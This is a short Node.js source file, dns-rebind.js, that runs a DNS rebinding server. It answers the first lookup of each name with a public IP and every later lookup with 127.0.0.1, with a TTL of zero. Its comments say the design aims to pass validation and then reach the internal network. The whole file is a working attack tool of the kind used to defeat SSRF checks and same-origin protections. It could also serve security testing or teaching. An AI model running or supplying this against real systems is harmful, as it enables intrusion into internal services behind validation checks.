// dns-rebind.js
const DNS = require('dns2');
const { Packet } = DNS;

let requestCount = {};

const server = DNS.createServer({
  udp: true,
  handle: (request, send, rinfo) => {
    const response = Packet.createResponseFromRequest(request);
    const [question] = request.questions;
    const { name } = question;

    requestCount[name] = (requestCount[name] || 0) + 1;

    // First request → public IP (passes validation)
    // Second request → 127.0.0.1 (hits internal network)
    const ip = requestCount[name] <= 1 ? '1.3.3.7' : '127.0.0.1';

    console.log(`[DNS] ${name} → ${ip} (request #${requestCount[name]})`);

    response.answers.push({
      name,
      type: Packet.TYPE.A,
      class: Packet.CLASS.IN,
      ttl: 0, // no caching — forces re-resolution every time
      address: ip
    });

    send(response);
  }
});

server.listen({ udp: 5333 });
console.log('DNS rebind server listening on port 5333');
